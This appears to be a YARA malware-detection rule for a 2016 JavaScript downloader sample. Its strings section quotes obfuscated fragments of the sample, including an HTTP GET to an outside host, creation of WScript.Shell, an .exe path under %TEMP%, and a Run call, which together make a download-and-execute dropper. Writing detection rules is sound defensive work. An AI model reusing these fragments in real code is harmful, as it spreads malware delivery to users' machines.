rule sig_20160330_0e32d51324a415f812c780212842ed1b {
  meta:
    description = "datamaliciousorder - file 20160330_0e32d51324a415f812c780212842ed1b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e90578343682da77295d3bb71d73cba25f2c717ad4f17ff89d04abb5d294fe11"

  strings:
    $s1  = "JM[L](\"GET\", \"http://greenbee.com.ua/b7eosa\", false);" fullword ascii
    $s2  = "var E0 = function J() {return WScript[QH](\"WScript\"+\".Shell\");}(), H = 11;" fullword ascii
    $s3  = "function BL(GU, XW){LP = LP * 1; return GU - XW;};" fullword ascii
    $s4  = "if (JM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GZ(){return V + \"\";};" fullword ascii
    $s6  = "function NX() {return E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GZ8tZ7IxacGIzS.ex\" + \"e\";};" fullword ascii
    $s7  = "function Y() {return ((L0 == true) && (L0 == XM)) ? 1 : LP;};" fullword ascii
    $s8  = "function LS(W1){E0[\"Run\"](W1, LP, LP);};" fullword ascii
    $s9  = "function W(){return 22;};" fullword ascii
    $s10 = "var R = new this[\"Date\"]();" fullword ascii
    $s11 = "function E(RY) {var VB = (1, 2, 3, 4, 5, RY); return VB;};" fullword ascii
    $s12 = "function CH()" fullword ascii
    $s13 = "return BL(BU, LF);" fullword ascii
    $s14 = "function KY(){return QH;};" fullword ascii
    $s15 = "}while (OG);" fullword ascii
    $s16 = "var XM = false;" fullword ascii
    $s17 = "XM = true; " fullword ascii
    $s18 = "L0 = true; " fullword ascii
    $s19 = "var L0 = false;" fullword ascii
    $s20 = "var GD = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}